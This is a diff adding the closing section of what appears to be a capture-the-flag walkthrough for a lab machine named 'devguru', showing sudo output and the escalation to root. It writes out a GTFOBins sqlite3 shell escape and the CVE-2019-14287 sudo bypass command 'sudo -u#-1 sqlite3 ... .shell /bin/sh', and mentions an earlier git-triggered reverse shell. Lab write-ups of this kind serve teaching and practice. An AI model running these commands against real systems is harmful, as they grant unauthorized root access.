@@ -188,4 +188,24 @@ update user set salt='PyWam2zNcZ' where salt = 'Bop8nwtUiM';
 * git commit -m "kill_me"
 * git push
 #### Now all we have to do is input our gitea creds from before and we get our reverse shell
+* sudo -l
+```
+Matching Defaults entries for frank on devguru:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User frank may run the following commands on devguru:
+    (ALL, !root) NOPASSWD: /usr/bin/sqlite3
+```
+#### Nice, finally something simple, lets get our GTFObin
+```
+frank@devguru:/dev/shm/devguru-website$ sudo sqlite3 /dev/null '.shell /bin/sh'
+[sudo] password for frank:
+```
+#### Nothing is simple anymore..
+#### Lets try out CVE-2019-14287
+* sudo -u#-1 sqlite3 /dev/null '.shell /bin/sh'
+
+### And we get our root shell :D
+
 
